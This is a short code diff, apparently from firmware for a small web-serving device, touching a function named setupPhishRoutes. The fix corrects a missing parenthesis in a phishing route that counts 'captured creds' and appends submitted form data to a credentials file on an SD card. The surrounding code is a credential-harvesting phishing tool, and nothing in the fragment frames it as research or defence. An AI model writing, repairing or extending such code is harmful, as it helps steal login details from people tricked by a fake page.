@@ -38,7 +38,7 @@ static void setupPhishRoutes() {
         [](AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
             credsCaptured++;
             if (setupSdCard()) {
-                if (!SD.exists("/arsenal") SD.mkdir("/arsenal");
+                if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
                 File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                 if (f) {
                     String body = String((char *)data).substring(0, len);
